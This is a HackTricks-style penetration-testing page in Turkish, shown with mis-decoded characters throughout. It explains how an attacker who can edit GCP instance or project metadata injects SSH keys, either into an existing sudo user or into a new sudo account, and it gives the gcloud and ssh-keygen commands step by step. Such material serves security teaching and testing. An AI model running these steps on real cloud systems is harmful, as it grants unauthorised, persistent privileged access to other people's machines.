# GCP - Ã–zel SSH Metadata Ekleme

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve uygulayÄ±n:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks EÄŸitimi AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve uygulayÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitimi GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katÄ±lÄ±n veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ± paylaÅŸarak PR'ler gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
{% endhint %}

## Metadata'yi DÃ¼zenleme <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

Bir Ã¶rneÄŸin metadata'sÄ±nÄ± deÄŸiÅŸtirmek, **saldÄ±rganÄ±n gerekli izinleri elde etmesi durumunda ciddi gÃ¼venlik risklerine yol aÃ§abilir**.

### **Ã–zel Metadata'ya SSH AnahtarlarÄ±nÄ±n Eklenmesi**

GCP'de, **Linux sistemleri** genellikle [Google Compute Engine iÃ§in Python Linux Konuk OrtamÄ±](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts) tarafÄ±ndan betikleri Ã§alÄ±ÅŸtÄ±rÄ±r. Bu iÅŸlemin kritik bir bileÅŸeni, [hesaplar daemonu](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts)dir, bu da **yetkilendirilmiÅŸ SSH genel anahtarlarÄ±nda gÃ¼ncellemeleri dÃ¼zenli olarak kontrol etmek** iÃ§in Ã¶rnek metadata uÃ§ noktasÄ±nÄ± kontrol eder.

Bu nedenle, bir saldÄ±rgan Ã¶zel metadata'yÄ± deÄŸiÅŸtirebiliyorsa, daemonun yeni bir genel anahtar bulmasÄ±nÄ± saÄŸlayabilir, bu da iÅŸlenecek ve **yerel sisteme entegre edilecektir**. Anahtar, mevcut bir kullanÄ±cÄ±nÄ±n `~/.ssh/authorized_keys` dosyasÄ±na eklenir veya anahtarÄ±n biÃ§imine baÄŸlÄ± olarak `sudo` ayrÄ±calÄ±klarÄ±na sahip yeni bir kullanÄ±cÄ± oluÅŸturabilir. Ve saldÄ±rgan, ana bilgisayarÄ± ele geÃ§irebilir.

### **Mevcut ayrÄ±calÄ±klÄ± kullanÄ±cÄ±ya SSH anahtarÄ± eklemek**

1. **Ã–rnekteki SSH AnahtarlarÄ±nÄ± Ä°nceleyin:**
- Mevcut SSH anahtarlarÄ±nÄ± bulmak iÃ§in Ã¶rneÄŸi ve metadata'sÄ±nÄ± aÃ§Ä±klamak iÃ§in komutu Ã§alÄ±ÅŸtÄ±rÄ±n. Ä°lgili bÃ¶lÃ¼m, `metadata` altÄ±nda, Ã¶zellikle `ssh-keys` anahtarÄ±nÄ±n altÄ±nda olacaktÄ±r.
```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
- SSH anahtarlarÄ±nÄ±n biÃ§imine dikkat edin: kullanÄ±cÄ± adÄ±, iki nokta Ã¼st Ã¼ste kullanÄ±larak ayrÄ±lmÄ±ÅŸtÄ±r.

2. **SSH Anahtar Metadata'sÄ± iÃ§in Bir Metin DosyasÄ± HazÄ±rlayÄ±n:**
- KullanÄ±cÄ± adlarÄ±nÄ±n ayrÄ±ntÄ±larÄ±nÄ± ve bunlara karÅŸÄ±lÄ±k gelen SSH anahtarlarÄ±nÄ± `meta.txt` adlÄ± bir metin dosyasÄ±na kaydedin. Bu, yeni eklenen anahtarlarÄ± eklerken mevcut anahtarlarÄ± korumak iÃ§in Ã¶nemlidir.

3. **Hedef KullanÄ±cÄ± Ä°Ã§in Yeni Bir SSH AnahtarÄ± OluÅŸturun (`alice` Ã¶rneÄŸinde):**
- Hedef kullanÄ±cÄ± adÄ±yla eÅŸleÅŸen bir yorum alanÄ±na (`-C`) sahip yeni bir SSH anahtarÄ± oluÅŸturmak iÃ§in `ssh-keygen` komutunu kullanÄ±n.
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
- Yeni genel anahtarÄ±, Ã¶rneÄŸin metadata'sÄ±nda bulunan formata benzeyerek `meta.txt`'ye ekleyin.

4. **Ã–rneÄŸin SSH Anahtar Metadata'sÄ±nÄ± GÃ¼ncelleyin:**
- GÃ¼ncellenmiÅŸ SSH anahtar metadata'sÄ±nÄ± Ã¶rneÄŸe `gcloud compute instances add-metadata` komutunu kullanarak uygulayÄ±n.
```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```

5. **Yeni SSH AnahtarÄ± Kullanarak Ã–rneÄŸe EriÅŸin:**
- Yeni anahtarÄ± kullanarak Ã¶rneÄŸe SSH ile baÄŸlanÄ±n ve hedef kullanÄ±cÄ±nÄ±n baÄŸlamÄ±nda kabuÄŸa eriÅŸin (`alice` Ã¶rneÄŸinde).
```bash
ssh -i ./key alice@localhost
sudo id
``` 

### **Yeni ayrÄ±calÄ±klÄ± bir kullanÄ±cÄ± oluÅŸturun ve bir SSH anahtarÄ± ekleyin**

EÄŸer ilginÃ§ bir kullanÄ±cÄ± bulunamazsa, `sudo` ayrÄ±calÄ±klarÄ± verilecek yeni bir kullanÄ±cÄ± oluÅŸturulabilir:
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### Proje DÃ¼zeyinde SSH AnahtarlarÄ± <a href="#sshing-around" id="sshing-around"></a>

Bulut ortamÄ±nda **proje dÃ¼zeyinde SSH eriÅŸimini geniÅŸletmek** mÃ¼mkÃ¼ndÃ¼r. Bu yaklaÅŸÄ±m, proje genelinde SSH anahtarlarÄ±nÄ± uygulayarak projenin iÃ§indeki herhangi bir Ã¶rneÄŸe SSH eriÅŸimine izin verir. Ä°ÅŸte Ã¶zetlenmiÅŸ bir rehber:

1. **Proje DÃ¼zeyinde SSH AnahtarlarÄ± Uygulama:**
- `gcloud compute project-info add-metadata` komutunu kullanarak `meta.txt` dosyasÄ±ndaki SSH anahtarlarÄ±nÄ± projenin meta verilerine ekleyin. Bu iÅŸlem, SSH anahtarlarÄ±nÄ±n projedeki tÃ¼m VM'lerde tanÄ±nmasÄ±nÄ± saÄŸlar, bir VM'in "Proje genelinde SSH anahtarlarÄ±nÄ± engelle" seÃ§eneÄŸini etkinleÅŸtirmediÄŸi sÃ¼rece.
```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```

2. **Proje Genelinde Anahtarlar Kullanarak Ã–rneklerde SSH Yapma:**
- Proje genelinde SSH anahtarlarÄ± mevcut olduÄŸunda, projenin iÃ§indeki herhangi bir Ã¶rneÄŸe SSH yapabilirsiniz. Proje genelinde anahtarlarÄ± engellemeyen Ã¶rnekler, SSH anahtarÄ±nÄ± kabul ederek eriÅŸime izin verecektir.
- Bir Ã¶rneÄŸe doÄŸrudan SSH yapmanÄ±n bir yolu, `gcloud compute ssh [Ã–RNEK]` komutunu kullanmaktÄ±r. Bu komut, mevcut kullanÄ±cÄ± adÄ±nÄ±zÄ± ve projenin dÃ¼zeyinde ayarlanmÄ±ÅŸ SSH anahtarlarÄ±nÄ± kullanarak eriÅŸim denemek iÃ§in kullanÄ±lÄ±r.


# Referanslar
* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)
